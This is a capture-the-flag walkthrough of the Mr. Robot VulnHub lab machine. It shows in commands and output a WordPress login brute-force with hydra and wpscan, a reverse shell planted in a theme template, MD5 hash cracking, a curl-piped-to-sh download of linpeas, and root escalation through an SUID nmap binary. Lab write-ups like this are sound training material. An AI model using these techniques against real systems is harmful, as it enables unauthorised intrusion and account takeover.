---
title: 'Mr Robot 1: Vulnhub Walkthrough'
description: "This is a walkthrough of the Mr. Robot themed Vulnhub box, located here: https://www.vulnhub.com/entry/mr-robot-1,151/"
date: 2025-05-16T19:20:39-08:00
featured: false 
draft: false
comment: true
toc: true
pinned: false
carousel: false
series:
  - walkthroughs
categories:
tags:
images: [mr-robot.webp]
---

## Introduction

| URL | [https://www.vulnhub.com/entry/mr-robot-1,151/](https://www.vulnhub.com/entry/mr-robot-1,151/) |
| --- | --- |
| Platform | VulnHub |
| Difficulty | ![Static Badge](https://img.shields.io/badge/medium-orange) |

## Walkthrough

**Initial `nmap` scan shows port 80 & 443 are open:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A 172.16.200.128
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 18:26 EDT
Nmap scan report for 172.16.200.128
Host is up (0.0012s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
MAC Address: 08:00:27:91:9B:8C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Amazon Fire TV (93%), Linux 3.2 - 3.8 (93%), Linux 3.13 - 4.4 (93%), Linux 3.18 (93%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Linux 2.6.32 - 3.13 (91%), Linux 3.16 - 4.6 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
```

\
**Run `gobuster` to discover a Wordpress site, and robots.txt:**

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://172.16.200.128 -e -r -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.200.128
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://172.16.200.128/.hta                 (Status: 403) [Size: 213]
http://172.16.200.128/.htaccess            (Status: 403) [Size: 218]
http://172.16.200.128/.htpasswd            (Status: 403) [Size: 218]
http://172.16.200.128/0                    (Status: 200) [Size: 8361]
http://172.16.200.128/admin                (Status: 200) [Size: 1188]
http://172.16.200.128/audio                (Status: 403) [Size: 215]
http://172.16.200.128/atom                 (Status: 200) [Size: 628]
http://172.16.200.128/blog                 (Status: 403) [Size: 214]
http://172.16.200.128/css                  (Status: 403) [Size: 213]
http://172.16.200.128/dashboard            (Status: 200) [Size: 2678]
http://172.16.200.128/favicon.ico          (Status: 200) [Size: 0]
http://172.16.200.128/feed                 (Status: 200) [Size: 811]
http://172.16.200.128/images               (Status: 403) [Size: 216]
http://172.16.200.128/Image                (Status: 200) [Size: 11869]
http://172.16.200.128/image                (Status: 200) [Size: 11869]
http://172.16.200.128/index.html           (Status: 200) [Size: 1077]
http://172.16.200.128/index.php            (Status: 200) [Size: 1077]
http://172.16.200.128/intro                (Status: 200) [Size: 516314]
http://172.16.200.128/js                   (Status: 403) [Size: 212]
http://172.16.200.128/license              (Status: 200) [Size: 309]
http://172.16.200.128/login                (Status: 200) [Size: 2678]
http://172.16.200.128/page1                (Status: 200) [Size: 1188]
http://172.16.200.128/phpmyadmin           (Status: 403) [Size: 94]
http://172.16.200.128/readme               (Status: 200) [Size: 64]
http://172.16.200.128/rdf                  (Status: 200) [Size: 811]
http://172.16.200.128/robots               (Status: 200) [Size: 41]
http://172.16.200.128/robots.txt           (Status: 200) [Size: 41]
http://172.16.200.128/rss                  (Status: 200) [Size: 811]
http://172.16.200.128/rss2                 (Status: 200) [Size: 811]
http://172.16.200.128/sitemap              (Status: 200) [Size: 0]
http://172.16.200.128/sitemap.xml          (Status: 200) [Size: 0]
http://172.16.200.128/video                (Status: 403) [Size: 215]
http://172.16.200.128/wp-admin             (Status: 200) [Size: 2678]
http://172.16.200.128/wp-content           (Status: 200) [Size: 0]
http://172.16.200.128/wp-includes          (Status: 403) [Size: 221]
http://172.16.200.128/wp-config            (Status: 200) [Size: 0]
http://172.16.200.128/wp-cron              (Status: 200) [Size: 0]
http://172.16.200.128/wp-links-opml        (Status: 200) [Size: 227]
http://172.16.200.128/wp-load              (Status: 200) [Size: 0]
http://172.16.200.128/wp-login             (Status: 200) [Size: 2678]
http://172.16.200.128/wp-settings          (Status: 500) [Size: 0]
http://172.16.200.128/wp-signup            (Status: 200) [Size: 2819]
http://172.16.200.128/xmlrpc               (Status: 405) [Size: 42]
http://172.16.200.128/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

\
**`robots.txt` contains:**

> User-agent: *
> fsocity.dic
> key-1-of-3.txt

\
**Going to `key-1-of-3.txt`**

> 073403c8a58a1f80d943455fb30724b9

\
**Dictionary file located at `https://172.16.200.128/fsocity.dic` contains many duplicate entries; can de-dupe using `sort/uniq`:**

```shell
┌──(kali㉿kali)-[~]
└─$ wc -l fsocity.dic 
858160 fsocity.dic
                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sort fsocity.dic |uniq |wc -l 
11451
                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sort fsocity.dic |uniq > fsocity-deduped.txt
```

\
**We can use hydra to brute-force the Wordpress username:**

```shell
$ hydra -t 64 -L fsocity-deduped.dic -p test123 172.16.200.128 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and e

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-12 18:44:33
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://192.168.1.152:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[80][http-post-form] host: 172.16.200.128   login: Elliot   password: test123
[80][http-post-form] host: 172.16.200.128   login: elliot   password: test123
```

\
**Password brute-force via `hydra` or `wpscan` reveals `ER28-0652`**

```shell
$ hydra -t 64 -l elliot -P fsocity-deduped.dic 172.16.200.128 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-12 18:53:46

[80][http-post-form] host: 172.16.200.128   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-13 01:47:37


┌──(kali㉿kali)-[~]
└─$ wpscan --url 172.16.200.128 --passwords fsocity-deduped.txt --usernames elliot
...
[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                           
All Found                                                                                                                
Progress Time: 00:00:17 <==================================                             > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

```

\
**Login to admin panel at http://172.16.200.128/wp-admin using credentials `elliot:ER28-0652`**

**Create a reverse shell:**

 1. In the WP panel go to Appearance --> Editor --> 404 Template
 2. Copy the Pentest Monkey Reverse Shell and paste it into the WordPress form. Make sure to edit $port and $ip variables.
 3. In a terminal window in kali create the listener (set the port to what you set above, in this case 9999):

```shell
$ nc -nlvp 9999   
listening on [any] 9999 ...
```

 4. Back on the WordPress site click `Update File`
 5. Visit a webpage that will trigger the 404 Error such as: http://<mr_robot_ip>/404trigger.html (or just visit /404.php)
 6. You now have a reverse shell on your listener terminal:

```shell
└─$ nc -nlvp 9999   
listening on [any] 9999 ...
connect to [172.16.200.128] from (UNKNOWN) [192.168.1.152] 57267
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 01:14:18 up 25 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
```

\
**In `/home/robot` there are interesting files:**

```shell
$ ls
key-2-of-3.txt
password.raw-md5
```

\
**Looking at the files:**
```shell
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied

$ ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5

$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

\
**Use JTR (or Crackstation) to find the password: abcdefghijklmnopqrstuvwxyz**

```shell
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
1g 0:00:00:00 DONE (2025-05-14 21:32) 33.33g/s 1356Kp/s 1356Kc/s 1356KC/s bonjour1..teletubbies
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

\
**Using su robot returned an error, so we need to upgrade the shell:**

```shell
$ python -c 'import pty; pty.spawn("/bin/bash")'

daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ 
```

\
**Capture the second key:**

```shell
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

\
**Running `LinPeas` or `find` command shows that `nmap` has the suidbit set:**

```shell
robot@linux:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
...
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
...
robot@linux:~$ find / -user root -perm -4000 -print 2>/dev/null | xargs ls -lh
...
-rwsr-xr-x 1 root root  10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
```

\
**Nmap versions < 5.21 allows interactive mode** (reference: https://gtfobins.github.io/gtfobins/nmap/):

```shell
robot@linux:~$ /usr/local/bin/nmap --version
nmap version 3.81 ( http://www.insecure.org/nmap/ )

robot@linux:~$ /usr/local/bin/nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

# whoami
root
```